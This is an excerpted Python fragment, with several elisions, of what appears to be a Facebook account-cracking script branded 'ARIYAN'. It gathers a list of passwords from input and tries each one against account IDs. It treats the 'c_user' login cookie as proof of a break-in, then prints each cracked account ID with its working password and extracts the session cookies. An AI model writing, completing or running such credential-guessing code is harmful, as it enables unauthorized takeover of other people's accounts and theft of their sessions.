...
def fia():    
			...
			if xd in ['1','01']:
				...
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+6}: '))
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[ARIYAN/💚] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			#print(iid+'|'+pws+'|'+cooki(log_cookies))
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[ARIYAN❤️ -OK] '+cid+' | '+ps+'\33[0;97m')
